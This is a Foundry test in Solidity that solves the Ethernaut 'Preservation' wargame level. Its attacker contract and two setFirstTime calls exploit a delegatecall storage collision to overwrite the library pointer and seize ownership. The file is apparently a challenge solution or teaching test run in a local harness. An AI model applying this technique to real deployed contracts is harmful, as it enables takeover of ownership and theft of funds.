// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Preservation} from "../src/levels/Preservation.sol";

/// Ethernaut #16 "Preservation" → Aegis catalog `proxy-storage-collision`. `setFirstTime`
/// delegatecalls a "library" whose `setTime` writes slot 0 — but in Preservation slot 0 is
/// `timeZone1Library`. So the first call rewrites the library pointer to an attacker contract; the
/// second call delegatecalls the attacker's `setTime`, which writes slot 2 (`owner`). Win: owner == player.
contract PreservationAttacker {
    // storage laid out to match Preservation: slot 0/1 = libraries, slot 2 = owner
    address slot0;
    address slot1;
    address slot2;

    function setTime(uint256 t) public {
        slot2 = address(uint160(t)); // writes Preservation.owner under delegatecall
    }
}

contract PreservationTest is Test {
    address player = makeAddr("player");

    function test_solve_preservation() public {
        // libraries don't matter for the exploit; use any contract with setTime.
        PreservationAttacker lib = new PreservationAttacker();
        Preservation lvl = new Preservation(address(lib), address(lib));

        PreservationAttacker atk = new PreservationAttacker();
        // 1) rewrite timeZone1Library (slot 0) to our attacker
        lvl.setFirstTime(uint256(uint160(address(atk))));
        // 2) now setFirstTime delegatecalls atk.setTime -> writes slot 2 (owner) = player
        lvl.setFirstTime(uint256(uint160(player)));

        assertEq(lvl.owner(), player, "owner seized via delegatecall storage collision");
    }
}
